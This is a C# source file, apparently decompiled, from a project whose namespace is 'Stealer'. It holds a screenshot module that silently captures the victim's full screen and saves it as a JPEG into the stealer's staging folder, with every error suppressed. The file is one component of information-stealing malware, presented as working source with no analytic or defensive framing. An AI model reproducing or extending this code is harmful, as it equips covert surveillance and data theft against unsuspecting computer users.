using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Stealer;

internal class Screenshot
{
	private enum ProcessDPIAwareness
	{
		ProcessDPIUnaware,
		ProcessSystemDPIAware,
		ProcessPerMonitorDPIAware
	}

	[DllImport("shcore.dll")]
	private static extern int SetProcessDpiAwareness(ProcessDPIAwareness value);

	private static void SetDpiAwareness()
	{
		try
		{
			if (Environment.OSVersion.Version.Major >= 6)
			{
				SetProcessDpiAwareness(ProcessDPIAwareness.ProcessPerMonitorDPIAware);
			}
		}
		catch (EntryPointNotFoundException)
		{
		}
	}

	public static void get(string filename)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		try
		{
			SetDpiAwareness();
			Rectangle bounds = Screen.GetBounds(new Point(0, 0));
			Bitmap val = new Bitmap(bounds.Width, bounds.Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			((Image)val).Save(Help.path_stealer + filename + ".jpeg", ImageFormat.get_Jpeg());
		}
		catch
		{
		}
	}
}
